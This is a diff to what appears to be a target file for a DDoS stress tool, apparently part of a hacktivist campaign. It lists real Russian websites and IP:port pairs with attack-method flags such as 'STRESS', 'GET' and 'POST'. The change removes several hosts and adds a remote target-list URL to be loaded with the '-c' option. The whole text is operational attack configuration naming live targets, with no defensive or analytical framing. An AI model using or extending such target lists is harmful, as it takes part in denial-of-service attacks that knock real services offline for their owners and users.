@@ -6,9 +6,8 @@ https://focus.kontur.ru/ https://focus-api.kontur.ru/ https://ff.kontur.ru/ http
 https://developer.kontur.ru/ https://evrika.kontur.ru/ https://cabinet.kontur.ru/ https://ca.kontur.ru/ https://www.kontur-extern.ru/ --http-methods GET STRESS
 
 #gaidamaky
-http://beriev.com http://be-200.com http://iktport.ru http://dev-iktport.ru http://hotel.iktport.ru http://booking.iktport.ru --http-methods STRESS
-tcp://178.21.10.34:22 tcp://178.21.10.34:21 tcp://178.21.10.34:443 tcp://178.21.10.34:465 tcp://195.206.41.118:1724
-tcp://89.223.123.192:22 tcp://89.223.123.192:3306 tcp://193.104.87.38:443 tcp://185.184.79.149:22
+http://iktport.ru http://dev-iktport.ru http://hotel.iktport.ru http://booking.iktport.ru --http-methods STRESS
+-c http://goals.ddosukraine.com.ua/haydamaky/targets_tcp.txt --http-methods POST STRESS
 
 #ddos separiv
 
